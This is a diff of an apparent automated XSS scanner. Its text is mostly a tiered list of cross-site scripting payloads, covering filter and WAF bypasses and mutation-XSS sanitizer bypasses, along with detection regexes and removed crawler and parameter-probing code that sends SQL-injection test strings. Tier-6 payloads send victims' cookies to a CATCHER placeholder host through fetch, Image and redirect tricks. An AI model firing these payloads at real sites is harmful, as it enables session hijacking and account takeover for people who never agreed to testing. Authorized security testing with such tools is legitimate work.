     {"id":"t1_img",           "pl":'<img src=x onerror=alert(1)>',                 "tier":1,"type":"html"},
     {"id":"t1_img_slash",     "pl":'<img/src=x/onerror=alert(1)>',                 "tier":1,"type":"html"},
     {"id":"t1_img_sp",        "pl":'<img src =q onerror=alert(1)>',                "tier":1,"type":"html"},
@@ -555,10 +453,10 @@ PAYLOADS = [
     {"id":"t1_input_af",      "pl":'<input autofocus onblur=alert(1)>',            "tier":1,"type":"html"},
     {"id":"t1_input_focus",   "pl":'<input autofocus onfocus=alert(1)>',           "tier":1,"type":"html"},
 
-    # ─────────────────────────────────────────────────────────────────────
-    # TIER 2 — attribute/quote breakout
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # TIER 2 --- attribute/quote breakout
     # For values reflected inside HTML attributes (href, src, value="...", etc.)
-    # ─────────────────────────────────────────────────────────────────────
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
     {"id":"t2_dq_script",     "pl":'"><script>alert(1)</script>',                  "tier":2,"type":"attr"},
     {"id":"t2_sq_script",     "pl":"'><script>alert(1)</script>",                  "tier":2,"type":"attr"},
     {"id":"t2_dq_svg",        "pl":'"><svg onload=alert(1)//',                     "tier":2,"type":"attr"},
@@ -597,10 +495,10 @@ PAYLOADS = [
     {"id":"t2_a_drag",        "pl":'<a draggable="true" ondrag="alert(1)">test</a>', "tier":2,"type":"attr"},
     {"id":"t2_a_dragstart",   "pl":'<a draggable="true" ondragstart="alert(1)">test</a>', "tier":2,"type":"attr"},
 
-    # ─────────────────────────────────────────────────────────────────────
-    # TIER 3 — JS string/template context breakout
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # TIER 3 --- JS string/template context breakout
     # For values reflected inside <script> blocks or event handler strings.
-    # ─────────────────────────────────────────────────────────────────────
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
     {"id":"t3_jsdq",          "pl":'";alert(1)//',                                 "tier":3,"type":"js"},
     {"id":"t3_jssq",          "pl":"';alert(1)//",                                 "tier":3,"type":"js"},
     {"id":"t3_jssq2",         "pl":"'-alert(1)-'",                                 "tier":3,"type":"js"},
@@ -622,10 +520,10 @@ PAYLOADS = [
     {"id":"t3_js_assign",     "pl":"';a=prompt,a()//",                             "tier":3,"type":"js"},
     {"id":"t3_js_assign_dq",  "pl":'";a=prompt,a()//',                             "tier":3,"type":"js"},
 
-    # ─────────────────────────────────────────────────────────────────────
-    # TIER 4 — filter bypass (case, entities, whitespace, encoding)
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # TIER 4 --- filter bypass (case, entities, whitespace, encoding)
     # For apps with basic XSS filters that block lowercase tags/events.
-    # ─────────────────────────────────────────────────────────────────────
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
     # Case mangling
     {"id":"t4_case_script",   "pl":'<ScRiPt>alert(1)</ScRiPt>',                   "tier":4,"type":"html"},
     {"id":"t4_case_X",        "pl":'<X onxxx=1',                                   "tier":4,"type":"html"},
@@ -672,11 +570,11 @@ PAYLOADS = [
     {"id":"t4_body_hash",     "pl":'<body onhashchange=alert(1)><a href=#x>click this!#x', "tier":4,"type":"html"},
     {"id":"t4_menu_show",     "pl":'<menu id=x contextmenu=x onshow=alert(1)>right click me!', "tier":4,"type":"html"},
 
-    # ─────────────────────────────────────────────────────────────────────
-    # TIER 5 — advanced / polyglot / obfuscated JS call
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # TIER 5 --- advanced / polyglot / obfuscated JS call
     # Handles tight WAF rules, multiple reflection contexts at once.
-    # ─────────────────────────────────────────────────────────────────────
-    # Polyglot — works in HTML, attr, JS, URL contexts simultaneously
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # Polyglot --- works in HTML, attr, JS, URL contexts simultaneously
     {"id":"t5_poly",          "pl":"jaVasCript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",'tier':5,"type":"poly"},
     {"id":"t5_gif_poly",      "pl":"GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;", "tier":5,"type":"poly"},
     # Comment-splitting (break keyword filters that block <script>)
@@ -745,10 +643,10 @@ PAYLOADS = [
     # Script base64/hash loader
     {"id":"t5_script_b64",    "pl":'<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)', "tier":5,"type":"html"},
 
-    # ─────────────────────────────────────────────────────────────────────
-    # TIER 4 EXTRA — encoding/null-byte/whitespace bypass (from xssvector list)
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # TIER 4 EXTRA --- encoding/null-byte/whitespace bypass (from xssvector list)
     # Null bytes, tab/CR/LF in attribute names, slash separators, quote tricks
-    # ─────────────────────────────────────────────────────────────────────
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
     # Null-byte between attr name and = (IE, Safari)
     {"id":"t4x_null_eq",       "pl":'<img src=1 onerror\x00=alert(0) />',            "tier":4,"type":"html"},
     # Null-byte between = and JS value (IE)
@@ -865,10 +763,10 @@ PAYLOADS = [
     # frameset onload
     {"id":"t4x_frameset_load", "pl":'<frameset onload=alert(123)>',                   "tier":4,"type":"html"},
 
-    # ─────────────────────────────────────────────────────────────────────
-    # TIER 5 EXTRA — advanced encoding, protocol, obfuscation, Unicode tricks
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # TIER 5 EXTRA --- advanced encoding, protocol, obfuscation, Unicode tricks
     # Payloads that require multi-step decoding or rare browser behaviours
-    # ─────────────────────────────────────────────────────────────────────
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
     # String.fromCharCode execution
     {"id":"t5x_sfc_script",    "pl":'<SCRIPT>String.fromCharCode(97,108,101,114,116,40,49,41)</SCRIPT>', "tier":5,"type":"js"},
     {"id":"t5x_sfc_img",       "pl":'<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>', "tier":5,"type":"html"},
@@ -1083,11 +981,11 @@ PAYLOADS = [
     {"id":"t5x_a_data_blabla", "pl":'<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>',  "tier":5,"type":"html"},
 
 
-    # ─────────────────────────────────────────────────────────────────────
-    # TIER 5 — mXSS (Mutation XSS) — sanitizer bypass via DOM re-parsing
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # TIER 5 --- mXSS (Mutation XSS) --- sanitizer bypass via DOM re-parsing
     # These bypass DOMPurify, angular sanitization, and similar filters.
-    # The browser mutates the HTML after sanitizer runs → XSS executes.
-    # ─────────────────────────────────────────────────────────────────────
+    # The browser mutates the HTML after sanitizer runs --- XSS executes.
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
     {"id":"mxss_svg_style",    "pl":'<svg><p><style><g id="</style><img src=1 onerror=alert(1)>">',             "tier":5,"type":"mxss"},
     {"id":"mxss_math_ann",     "pl":'<math><annotation-xml encoding="text/html"><img src=1 onerror=alert(1)></annotation-xml></math>', "tier":5,"type":"mxss"},
     {"id":"mxss_table_svg",    "pl":'<table><td><svg><script>alert(1)</script></td></table>',                   "tier":5,"type":"mxss"},
@@ -1100,10 +998,10 @@ PAYLOADS = [
     {"id":"mxss_svg_animate",  "pl":'<svg><animate attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a></svg>', "tier":5,"type":"mxss"},
     {"id":"mxss_select",       "pl":'<select><option><img src=1 onerror=alert(1)></option></select>',          "tier":5,"type":"mxss"},
     {"id":"mxss_svg_a_xlink",  "pl":'<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><circle r=400 /></a></svg>', "tier":5,"type":"mxss"},
-    # ─────────────────────────────────────────────────────────────────────
-    # TIER 6 — cookie exfiltration (fires after tier ≤5 confirm XSS)
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # TIER 6 --- cookie exfiltration (fires after tier ---5 confirm XSS)
     # Only used when a catcher URL is available.
-    # ─────────────────────────────────────────────────────────────────────
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
     {"id":"t6_ck_img",        "pl":'<img src=x onerror="document.location=\'CATCHER?c=\'+document.cookie">',  "tier":6,"type":"cookie"},
     {"id":"t6_ck_fetch",      "pl":"<script>fetch('CATCHER?c='+encodeURIComponent(document.cookie))</script>", "tier":6,"type":"cookie"},
     {"id":"t6_ck_img2",       "pl":"<script>new Image().src='CATCHER?c='+document.cookie</script>",            "tier":6,"type":"cookie"},
@@ -1111,532 +1009,39 @@ PAYLOADS = [
     {"id":"t6_ck_iframe",     "pl":'<iframe src="javascript:document.location=\'CATCHER?c=\'+parent.document.cookie">',  "tier":6,"type":"cookie"},
 ]
 
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # XSS CONFIRMATION PATTERNS
 # Applied by XSSVerifier to decide if a reflection is live XSS.
 # Covers all new event handlers, elements, and JS call patterns added above.
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 XSS_CONFIRM_RE = [
-    # Script block with alert
-    re.compile(r'<script[^>]*>\s*alert',                              re.I | re.S),
-    # Any on* handler = alert (broad — catches all the element+event combos)
-    re.compile(r'\bon\w+\s*=\s*alert',                                re.I),
-    # javascript: protocol
-    re.compile(r'javascript\s*:',                                     re.I),
-    # SVG onload
-    re.compile(r'<svg[^>]*onload\s*=',                                re.I),
-    # img/image/audio/video onerror/onload
-    re.compile(r'<(?:img|image|audio|video)[^>]*on(?:error|load|loadstart)\s*=', re.I),
-    # iframe srcdoc
-    re.compile(r'<iframe[^>]*srcdoc',                                 re.I),
-    # details ontoggle
-    re.compile(r'<details[^>]*ontoggle',                              re.I),
-    # input/keygen autofocus onfocus
-    re.compile(r'<(?:input|keygen)[^>]*onfocus',                      re.I),
-    # body/html global events
-    re.compile(r'<(?:body|html)[^>]*on(?:load|pageshow|focus|hashchange|resize|scroll|message|popstate|orientationchange|touchstart|touchend|touchmove|unhandledrejection|wheel|afterprint|beforeprint|beforeunload)\s*=', re.I),
-    # marquee onstart/onfinish
-    re.compile(r'<marquee[^>]*on(?:start|finish)\s*=',               re.I),
-    # form/button/input formaction javascript:
-    re.compile(r'formaction\s*=\s*["\']?javascript\s*:',             re.I),
-    # object data javascript:
-    re.compile(r'<object[^>]*data\s*=\s*["\']?javascript\s*:',       re.I),
-    # embed src javascript:
-    re.compile(r'<embed[^>]*src\s*=\s*["\']?javascript\s*:',         re.I),
-    # xlink:href javascript:
-    re.compile(r'xlink:href\s*=\s*["\']?javascript\s*:',             re.I),
-    # SVG animate with javascript:
-    re.compile(r'<animate[^>]*from\s*=\s*["\']?javascript\s*:',      re.I),
-    # data: URI script
-    re.compile(r'src\s*=\s*["\']?data:\s*&comma;\s*alert',           re.I),
-    # Obfuscated alert calls (backtick, array, eval, base36)
-    re.compile(r'alert`\d',                                           re.I),
-    re.compile(r'\[1\]\.find\s*\(\s*alert\s*\)',                      re.I),
-    re.compile(r'top\s*\[.*alert.*\]',                                re.I),
-    re.compile(r'eval\s*\(\s*(?:URL|location)',                       re.I),
-    re.compile(r'8680439\.\.toString',                                re.I),
-    # GIF polyglot
-    re.compile(r'GIF89a.*<svg',                                       re.I | re.S),
-    # tabindex+onfocus/onfocusin
-    re.compile(r'tabindex\s*=.*on(?:focus|focusin)\s*=\s*alert',     re.I),
-    # Contenteditable + any interaction handler
-    re.compile(r'contenteditable[^>]*on(?:paste|copy|cut|keydown|keyup|keypress|input|blur)\s*=\s*alert', re.I),
-    # Drag events
-    re.compile(r'on(?:drag|dragstart|dragend|dragenter|dragleave)\s*=\s*alert', re.I),
-    # Audio/video media events
-    re.compile(r'on(?:canplay|loadeddata|loadedmetadata|play|playing|pause|ended|timeupdate|volumechange|seeked|seeking)\s*=\s*alert', re.I),
-    # menu onshow
-    re.compile(r'<menu[^>]*onshow\s*=',                               re.I),
-    # button/link/anchor misc events
-    re.compile(r'on(?:contextmenu|dblclick|mousedown|mouseup|mousemove|mouseenter|mouseleave|mouseout)\s*=\s*alert', re.I),
-    # innerHTML / location hash
-    re.compile(r'innerHTML\s*=\s*location\.hash',                     re.I),
-    # String.fromCharCode execution
-    re.compile(r'String\.fromCharCode\s*\(',                           re.I),
-    # eval(String['fromCharCode'](...))
-    re.compile(r"eval\s*\(\s*String\s*\[",                           re.I),
-    # UTF-7 +ADw- script +AD4-
-    re.compile(r'\+ADw-script\+AD4-',                                   re.I),
-    # formaction javascript:
-    re.compile(r'formaction\s*=\s*["\'\']?javascript',                re.I),
-    # style expression (IE)
-    re.compile(r'style[^>]*expression\s*\(',                            re.I),
-    # object data base64 / embed src base64
-    re.compile(r'(?:data|src)\s*=\s*["\'\']?data:(?:text/html|image/svg)',  re.I),
-    # vbscript: protocol
-    re.compile(r'vbscript\s*:',                                          re.I),
-    # onreadystatechange
-    re.compile(r'onreadystatechange\s*=',                                re.I),
-    # xlink:href data:
-    re.compile(r'xlink:href\s*=\s*["\'\']?data:',                    re.I),
-    # img/video/audio src backtick onerror
-    re.compile(r'src\s*=\s*`[^`]*`\s*onerror',                        re.I),
-    # BGSOUND src javascript:
-    re.compile(r'<bgsound[^>]*src\s*=\s*["\'\']?javascript',         re.I),
-    # LAYER src
-    re.compile(r'<layer[^>]*src\s*=',                                    re.I),
-    # TABLE/TD/DIV BACKGROUND javascript:
-    re.compile(r'background\s*=\s*["\'\']?javascript',                re.I),
-    # LINK REL stylesheet javascript:
-    re.compile(r'<link[^>]*href\s*=\s*["\'\']?javascript',           re.I),
-    # BASE href javascript:
-    re.compile(r'<base[^>]*href\s*=\s*["\'\']?javascript',           re.I),
-    # INPUT TYPE=IMAGE SRC javascript:
-    re.compile(r'<input[^>]*type\s*=\s*["\'\']?image["\'\'][^>]*src\s*=\s*["\'\']?javascript', re.I),
-    # FRAMESET FRAME src javascript:
-    re.compile(r'<frame[^>]*src\s*=\s*["\'\']?javascript',           re.I),
-    # META http-equiv refresh javascript:/data:
-    re.compile(r'<meta[^>]*content\s*=.*(?:javascript:|data:text/html)', re.I),
-    # isindex formaction/action javascript:
-    re.compile(r'<isindex[^>]*(?:form)?action\s*=\s*["\'\']?javascript', re.I),
-    # confirm( call — used by many payloads
-    re.compile(r'confirm\s*\(',                                          re.I),
-    # prompt( call
-    re.compile(r'prompt\s*\(',                                           re.I),
-    # window.open via onerror
-    re.compile(r'onerror\s*=.*window\.open',                            re.I),
-    # document.write in onerror/onload
-    re.compile(r'(?:onerror|onload)\s*=.*document\.write',             re.I),
-    # script for=document event=onreadystatechange (IE)
-    re.compile(r'<script[^>]*for\s*=\s*document[^>]*event\s*=',       re.I),
-    # style onload (Webkit/FF)
-    re.compile(r'<style[^>]*onload\s*=',                                 re.I),
-    # mXSS — annotation-xml text/html (DOMPurify bypass)
-    re.compile(r'annotation-xml[^>]*encoding.*text/html',                 re.I),
-    # mXSS — mglyph/style after math (mutation)
-    re.compile(r'<mglyph[^>]*>.*?<style>',                                re.I | re.S),
-    # mXSS — SVG script after table
-    re.compile(r'<table[^>]*>.*?<svg>.*?<script>',                        re.I | re.S),
-    # mXSS — animate attributeName=href javascript:
-    re.compile(r'<animate[^>]*attributeName\s*=\s*["\']?href',        re.I),
-    # uXSS — document.domain in alert
-    re.compile(r'alert\s*\(\s*document\.domain',                      re.I),
+    # Script block variations with execution sinks
+    re.compile(r'<script[^>]*>.*?(?:alert|confirm|prompt|print|document\.write|eval)\s*\(', re.I | re.S),
+    # Broad event handler detection: onxxxx=...[sink]...
+    re.compile(r'\bon[a-z]+\s*=\s*["\']?[^"\'>]*(?:alert|confirm|prompt|print|eval|atob|String\.fromCharCode)\s*[\(`]', re.I),
+    # Prototype/Protocol handlers in URI attributes
+    re.compile(r'(?:href|src|action|formaction|data|background|xlink:href)\s*=\s*["\']?\s*(?:javascript|data):', re.I),
+    # CSS expressions for older/compatibility modes
+    re.compile(r'style\s*=\s*["\']?[^"\'>]*expression\s*\(', re.I),
+    # Modern HTML5 elements and auto-firing events (ontoggle, onfocusin, etc.)
+    re.compile(r'<(?:svg|details|iframe|audio|video|input|keygen|body|html|marquee|object|embed|isindex|table|math|mglyph)[^>]*on(?:load|error|toggle|focus|pageshow|focusin|focusout|hashchange|resize|scroll|message|popstate|touchstart|touchend|touchmove|unhandledrejection|wheel|afterprint|beforeprint|beforeunload|start|finish|pointerdown|pointerup)\s*=', re.I),
+    # Iframe srcdoc injection
+    re.compile(r'srcdoc\s*=\s*["\']?\s*<', re.I),
+    # Obfuscated JS call patterns (backticks, array accessors, base36)
+    re.compile(r'(?:alert|confirm|prompt|print|eval)`\d+`', re.I),
+    re.compile(r'\[\d+\]\.find\s*\(\s*(?:alert|confirm|prompt|print)\s*\)', re.I),
+    re.compile(r'(?:top|window|self|parent|frames|this)\[["\']?(?:al|con|pro|pri)[^"\'\]]*["\']?\]\s*[\(`]', re.I),
+    re.compile(r'eval\s*\(\s*(?:URL|location|name|atob|decodeURIComponent|history\.state|location\.hash)', re.I),
+    re.compile(r'8680439\.\.toString', re.I), # base36 'alert'
+    # mXSS and dangerous DOM assignments
+    re.compile(r'\.innerHTML\s*=\s*location', re.I),
+    re.compile(r'annotation-xml[^>]*encoding.*text/html', re.I),
 ]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# THREADED CRAWLER  — HELLHOUND ThreadPoolExecutor architecture
-# ─────────────────────────────────────────────────────────────────────────────
-class Crawler:
-    """
-    HELLHOUND-style threaded crawler adapted for XSS endpoint discovery.
-
-    Architecture:
-      - ThreadPoolExecutor with configurable worker count (default 10)
-      - _visited_lock  protects shared visited set (thread-safe dedup)
-      - _ep_lock       protects shared endpoints list
-      - _print_lock    (global) for thread-safe console output
-      - Batched crawling: process current_batch → collect new_links → repeat
-      - JS files tagged with __JS__ prefix, processed by separate worker pool
-
-    Differences from v3.1 sequential crawler:
-      - All pages in a batch process concurrently (10x+ speed on deep sites)
-      - JS extraction runs in parallel alongside HTML processing
-      - Progress shown as live counter, not per-page noise
-      - Thread-safe endpoint dedup via _ep_lock
-    """
-    def __init__(self, base, client, max_pages=80, max_depth=3, threads=10):
-        self.base       = base.rstrip("/")
-        self._bp        = urllib.parse.urlparse(base)
-        self.client     = client
-        self.max_pages  = max_pages
-        self.max_depth  = max_depth
-        self.threads    = threads
-        # HELLHOUND-style locks
-        self._visited_lock = threading.Lock()
-        self._ep_lock      = threading.Lock()
-        self.visited    = set()
-        self.js_visited = set()
-        self.endpoints  = []
-        self._js        = JSExtractor()
-        self.spa_count  = 0
-
-    def _same_domain(self, url):
-        return urllib.parse.urlparse(url).netloc == self._bp.netloc
-
-    def _normalize(self, url):
-        p = urllib.parse.urlparse(url)
-        return urllib.parse.urlunparse(
-            (p.scheme, p.netloc, p.path, p.params, p.query, ""))
-
-    def _add_endpoint(self, url, method, params, hidden, source):
-        if not params: return
-        with self._ep_lock:
-            key = (url, method, frozenset(params.keys()))
-            exists = any(
-                (e["url"], e["method"], frozenset(e["params"].keys())) == key
-                for e in self.endpoints)
-            if not exists:
-                self.endpoints.append({
-                    "url":    url,
-                    "method": method,
-                    "params": params,
-                    "hidden": hidden or {},
-                    "source": source,
-                })
-
-    def _process_js(self, js_url):
-        """Process one JS file — extract endpoints, return new page links."""
-        with self._visited_lock:
-            if js_url in self.js_visited: return []
-            self.js_visited.add(js_url)
-
-        resp = self.client.get_raw(js_url)
-        if not resp["ok"] or resp["status"] == 0: return []
-
-        endpoints = self._js.extract(resp["body"], self.base)
-        new_links = []
-
-        for ep in endpoints:
-            path = ep["path"]
-            full = (path if path.startswith("http")
-                    else urllib.parse.urljoin(self.base, path))
-            if not self._same_domain(full): continue
-
-            if ep["params"]:
-                params = {p: "test" for p in ep["params"]}
-                self._add_endpoint(full, ep["method"], params, {}, f"js:{js_url[-40:]}")
-                with self._ep_lock:
-                    self.spa_count += 1
-                _m = ep["method"]; _p = path[:55]; _pc = len(ep["params"])
-                tprint(f"  {js_ep(f'{_m} {_p} [{_pc} params] ← {js_url[-35:]}')}")
-            else:
-                norm = self._normalize(full)
-                with self._visited_lock:
-                    if (norm not in self.visited
-                            and len(self.visited) < self.max_pages):
-                        self.visited.add(norm)
-                        new_links.append((full, 1))
-
-        # WebSocket endpoints: log but don't add as testable (no HTTP params)
-        # REST/API patterns common in SPAs
-        patterns = [
-            re.compile(r'axios\.(get|post|put|delete|patch)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
-            re.compile(r'fetch\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
-            re.compile(r'\$\.(get|post|ajax)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
-            re.compile(r'(?:this\.|self\.)?(?:http|api)\.(get|post|put|delete|patch)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
-            re.compile(r'XMLHttpRequest[^;]{0,200}\.open\s*\(\s*["\']([A-Z]+)["\']\s*,\s*["\']([^"\']{3,80})["\']', re.I),
-            re.compile(r'["\`](/(?:api|v\d+|rest|graphql|admin|auth|user|account|search|upload|ws)[a-zA-Z0-9_\-\./]*)["\`]', re.I),
-            re.compile(r'(?:router|app|Route)\s*\.\s*(get|post|put|delete|patch|use)\s*\(\s*["\']([^"\']{2,60})["\']', re.I),
-        ]
-        # Parameter extraction from JS strings/json
-        param_patterns = [
-            re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=', re.I),
-            re.compile(r'["\']?([a-zA-Z_][a-zA-Z0-9_]{1,30})["\']?\s*:', re.I), # JSON keys
-        ]
-        for ws in ep.get("ws_endpoints", []) if endpoints else []:
-            tprint(f"  {js_ep(f'WS endpoint: {ws[:70]}')}")
-
-        return new_links
-
-    def _process_page(self, url, depth):
-        """
-        Fetch one page, extract forms/params/inline-JS/links.
-        Returns list of (new_url, depth) tuples for the next batch.
-        """
-        resp   = self.client.get(url)
-        status = resp["status"]
-
-        # Live counter (HELLHOUND style — overwrite same line)
-        with self._visited_lock:
-            n = len(self.visited)
-        sys.stdout.write(
-            f"\r  {color(f'  crawling... {n} pages found', C.DIM)}  ")
-        sys.stdout.flush()
-
-        if status == 0: return []
-
-        # Query-string params from URL itself
-        parsed = urllib.parse.urlparse(url)
-        qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
-        if qs:
-            clean  = parsed._replace(query="").geturl()
-            params = {k: (v[0] if v else "") for k, v in qs.items()}
-            self._add_endpoint(clean, "GET", params, None, "url_query")
-
-        new_links = []
-        ct   = resp["headers"].get("content-type", "")
-        body = resp.get("body", "")
-
-        if "html" in ct or body.lstrip().startswith("<"):
-            parser = PageParser(url)
-            try: parser.feed(body)
-            except Exception: pass
-
-            # Forms
-            for form in parser.forms:
-                testable = {i["name"]: i["value"]
-                            for i in form["inputs"] if i["type"] != "hidden"}
-                hidden   = {i["name"]: i["value"]
-                            for i in form["inputs"] if i["type"] == "hidden"}
-                if testable:
-                    self._add_endpoint(form["action"], form["method"],
-                                       testable, hidden, f"form@{url[:40]}")
-
-            # Inline scripts — use enhanced JSExtractor
-            for sc in re.findall(r'<script[^>]*>(.*?)</script>', body,
-                                  re.DOTALL | re.I):
-                if len(sc) > 50:
-                    for ep in self._js.extract(sc, url):
-                        if ep["params"]:
-                            full = urllib.parse.urljoin(url, ep["path"])
-                            if self._same_domain(full):
-                                self._add_endpoint(
-                                    full, ep["method"],
-                                    {p: "test" for p in ep["params"]},
-                                    {}, f"inline_js@{url[-30:]}")
-
-            # Follow links
-            if depth < self.max_depth:
-                for link in parser.links:
-                    norm = self._normalize(link)
-                    with self._visited_lock:
-                        if (norm not in self.visited
-                                and self._same_domain(link)
-                                and len(self.visited) < self.max_pages):
-                            self.visited.add(norm)
-                            new_links.append((link, depth + 1))
-
-            # Queue JS files for parallel processing
-            for js_url in parser.js_links:
-                with self._visited_lock:
-                    if js_url not in self.js_visited:
-                        new_links.append((f"__JS__{js_url}", 0))
-
-        elif "javascript" in ct or url.endswith(".js"):
-            new_links.extend(self._process_js(url))
-
-        return new_links
-
-    def _parse_robots(self):
-        """Standard robots.txt parsing."""
-        robots_url = urllib.parse.urljoin(self.base, "/robots.txt")
-        resp = self.client.get(robots_url)
-        if resp["ok"] and resp["status"] == 200:
-            paths = re.findall(r'(?:Allow|Disallow):\s*(\/\S*)', resp["body"], re.I)
-            if paths:
-                tprint(f"  {info(f'Discovered {len(paths)} paths from robots.txt')}")
-                for p in paths:
-                    full = urllib.parse.urljoin(self.base, p)
-                    if self._same_domain(full):
-                        self._normalize(full)
-                        with self._visited_lock:
-                            if len(self.visited) < self.max_pages:
-                                self.visited.add(full)
-                                yield (full, 1)
-
-    def _parse_sitemap(self):
-        """Standard sitemap.xml parsing."""
-        sitemap_url = urllib.parse.urljoin(self.base, "/sitemap.xml")
-        resp = self.client.get(sitemap_url)
-        if resp["ok"] and resp["status"] == 200:
-            urls = re.findall(r'<loc>(https?://[^<]+)</loc>', resp["body"], re.I)
-            if urls:
-                tprint(f"  {info(f'Discovered {len(urls)} URLs from sitemap.xml')}")
-                for u in urls:
-                    if self._same_domain(u):
-                        with self._visited_lock:
-                            if len(self.visited) < self.max_pages:
-                                self.visited.add(u)
-                                yield (u, 1)
-
-    def crawl(self):
-        """
-        HELLHOUND-style batched ThreadPoolExecutor crawl.
-        Processes html_batch and js_batch concurrently each round.
-        Shows live progress counter and summary on completion.
-        """
-        section(f"PHASE 1/5 — RECONNAISSANCE & DISCOVERY [INTERNAL ENGINE]", "🕷")
-        tprint(f"  {color('─'*68, C.DIM)}")
-        tprint(f"  {info(f'Threads: {self.threads} | Max pages: {self.max_pages} | Depth: {self.max_depth}')}\n")
-
-        norm_base = self._normalize(self.base)
-        with self._visited_lock:
-            self.visited.add(norm_base)
-
-        current_batch = [(self.base, 0)]
-        
-        # Recon phase 0: Robots & Sitemap
-        current_batch.extend(list(self._parse_robots()))
-        current_batch.extend(list(self._parse_sitemap()))
-
-        with ThreadPoolExecutor(max_workers=self.threads) as pool:
-            while current_batch:
-                # Split batch into JS vs HTML work items
-                js_batch   = [(url[6:], d) for url, d in current_batch
-                               if url.startswith("__JS__")]
-                html_batch = [(url, d) for url, d in current_batch
-                               if not url.startswith("__JS__")]
-
-                futures = {}
-                for url, depth in html_batch:
-                    futures[pool.submit(self._process_page, url, depth)] = "html"
-                for js_url, depth in js_batch:
-                    futures[pool.submit(self._process_js, js_url)] = "js"
-
-                current_batch = []
-                for fut in as_completed(futures):
-                    try:
-                        new_links = fut.result()
-                        current_batch.extend(new_links)
-                    except Exception:
-                        pass
-
-                with self._visited_lock:
-                    if len(self.visited) >= self.max_pages:
-                        current_batch = []
-                        break
-
-        # Clear the crawl progress line
-        sys.stdout.write("\r" + " " * 65 + "\r")
-
-        spa_note  = f" + {self.spa_count} from JS/SPA" if self.spa_count else ""
-        ep_note   = f"{len(self.endpoints)} endpoints"
-        tprint(f"  {ok(f'{len(self.visited)} pages crawled{spa_note} — {ep_note} found')}")
-        return self.endpoints
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# PARAMETER DISCOVERY ENGINE
-# ─────────────────────────────────────────────────────────────────────────────
-class ParamDiscovery:
-    MALFORMED = ["'", "\\", "<", "%00", "{{7*7}}", "' OR '1'='1"]
-    ERR_PATS  = [
-        re.compile(r'(?:parameter|param|field|argument|variable|key|input)\s+[\'"]?([a-zA-Z_][a-zA-Z0-9_]{1,30})[\'"]?', re.I),
-        re.compile(r'\b([a-zA-Z_][a-zA-Z0-9_]{1,30})\s+(?:is\s+)?(?:required|missing|invalid|not found|cannot be blank)', re.I),
-        re.compile(r'(?:missing|required|unknown|invalid)\s+(?:key|param|field|arg):\s+[\'"]?([a-zA-Z_][a-zA-Z0-9_]{1,30})[\'"]?', re.I),
-        re.compile(r'"([a-zA-Z_][a-zA-Z0-9_]{1,30})"\s*:\s*"[^"]*(?:required|invalid|missing)', re.I),
-    ]
-    NOISE = {
-        'true','false','null','none','error','exception','message','stack',
-        'trace','line','file','type','object','string','number','boolean',
-        'undefined','nan','function','class','method','module'
-    }
-
-    def __init__(self, client): self.client = client; self._lock = threading.Lock()
-
-    def _req(self, url, method, params):
-        try:
-            return (self.client.post(url, params) if method == "POST"
-                    else self.client.get(url, params))
-        except Exception: return None
-
-    def _baseline(self, url, method):
-        r = self._req(url, method, {})
-        return ((r["body"] if r else ""),
-                (r["status"] if r else 0),
-                (len(r["body"]) if r else 0))
-
-    def probe_errors(self, url, method="GET"):
-        found = set()
-        for probe_val in self.MALFORMED:
-            for probe_key in ["q","id","search","input","value","data","__invalid__"]:
-                r = self._req(url, method, {probe_key: probe_val})
-                if not r: continue
-                body = r["body"]
-                is_err = (r["status"] >= 400 or
-                          any(w in body.lower() for w in
-                              ["error","exception","invalid","required",
-                               "missing","traceback","syntax"]))
-                if not is_err: continue
-                for pat in self.ERR_PATS:
-                    for m in pat.findall(body):
-                        name = m.strip().strip("'\"").lower()
-                        if (3 <= len(name) <= 30 and name.isidentifier()
-                                and name not in self.NOISE):
-                            if name not in found:
-                                found.add(name)
